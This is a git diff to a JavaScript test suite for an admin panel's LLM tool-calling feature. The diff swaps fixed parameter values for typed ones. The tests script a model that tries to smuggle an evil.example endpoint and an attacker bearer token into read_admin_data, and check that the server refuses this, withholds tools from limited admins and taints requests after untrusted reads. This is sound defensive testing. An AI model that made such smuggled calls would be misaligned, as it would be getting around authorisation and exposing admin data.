@@ -80,7 +80,8 @@ const intelligenceRouter = require('../routes/admin-intelligence-bar');
 
 const OWNER = 'Bearer owner-token-abcdef';
 const OTHER_ADMIN = 'Bearer other-admin-token-abcdef';
-const ENTRY = catalog.entries.find(entry => entry.params.length === 1);
+const ENTRY = catalog.entries.find(entry => entry.params.length === 1 && entry.paramKinds?.[entry.params[0]] !== 'text');
+const ENTRY_VALUE = { uuid: '10000000-0000-4000-8000-00000000000a', int: '4821' }[ENTRY.paramKinds[ENTRY.params[0]]];
 const LOOPBACK = `http://127.0.0.1:${Number(config.port)}/api/`;
 const realFetch = global.fetch;
 
@@ -136,7 +137,7 @@ test('the owner login reads through the request token, and the token is stored a
   const seen = [];
   scriptModel([
     toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }),
-    (request) => { seen.push(request.tools.map(t => t.name)); return toolUse('t2', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: 'abc-1' } }); },
+    (request) => { seen.push(request.tools.map(t => t.name)); return toolUse('t2', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } }); },
     { content: [{ type: 'text', text: 'The timeline has one visit.' }] },
   ]);
   await withServer(async (baseUrl) => {
@@ -149,7 +150,7 @@ test('the owner login reads through the request token, and the token is stored a
   expect(seen[0]).toContain('read_admin_data');
   expect(loopbackCalls).toHaveLength(1);
   expect(loopbackCalls[0].headers.Authorization).toBe(OWNER);
-  expect(new URL(loopbackCalls[0].url).pathname).toBe(`/api${ENTRY.endpoint.replace(`:${ENTRY.params[0]}`, 'abc-1')}`);
+  expect(new URL(loopbackCalls[0].url).pathname).toBe(`/api${ENTRY.endpoint.replace(`:${ENTRY.params[0]}`, ENTRY_VALUE)}`);
   expect(loopbackCalls[0].headers[ADMIN_READ_HEADER]).toMatch(/^1;p=\d+(,\d+)*$/);
 
   const stored = JSON.stringify({
@@ -169,7 +170,7 @@ test('a model that smuggles its own token or URL gets nothing', async () => {
   scriptModel([
     toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }),
     toolUse('t2', 'read_admin_data', { endpoint: `http://evil.example/api${ENTRY.endpoint}`, staffAuthorization: 'Bearer attacker-token-attacker' }),
-    toolUse('t3', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: '1' }, staffAuthorization: 'Bearer attacker-token-attacker' }),
+    toolUse('t3', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE }, staffAuthorization: 'Bearer attacker-token-attacker' }),
     { content: [{ type: 'text', text: 'Could not read it.' }] },
   ]);
   await withServer(async (baseUrl) => {
@@ -183,7 +184,7 @@ test('an admin login without full access never gets the tools or a read', async 
   const lists = [];
   scriptModel([
     (request) => { lists.push(request.tools.map(t => t.name)); return toolUse('t1', 'discover_capabilities', { query: 'admin screen data read endpoint' }); },
-    (request) => { lists.push(request.tools.map(t => t.name)); return toolUse('t2', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: '1' } }); },
+    (request) => { lists.push(request.tools.map(t => t.name)); return toolUse('t2', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } }); },
     { content: [{ type: 'text', text: 'No.' }] },
   ]);
   await withServer(async (baseUrl) => {
@@ -217,7 +218,7 @@ test('with the gate off the owner login does not get the tools either', async ()
 
 test('the tech rail refuses a forced call even on the owner login', async () => {
   scriptModel([
-    toolUse('t1', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: '1' } }),
+    toolUse('t1', 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } }),
     { content: [{ type: 'text', text: 'Refused.' }] },
   ]);
   await withServer(async (baseUrl) => {
@@ -314,7 +315,7 @@ describe('untrusted read data and owner-direct edits', () => {
       expect(status).toBe(200);
     });
   };
-  const readCall = id => toolUse(id, 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: 'abc-1' } });
+  const readCall = id => toolUse(id, 'read_admin_data', { endpoint: ENTRY.endpoint, params: { [ENTRY.params[0]]: ENTRY_VALUE } });
 
   test('a read that returned data taints the rest of the request, and a later edit is planned with the flag', async () => {
     await run([
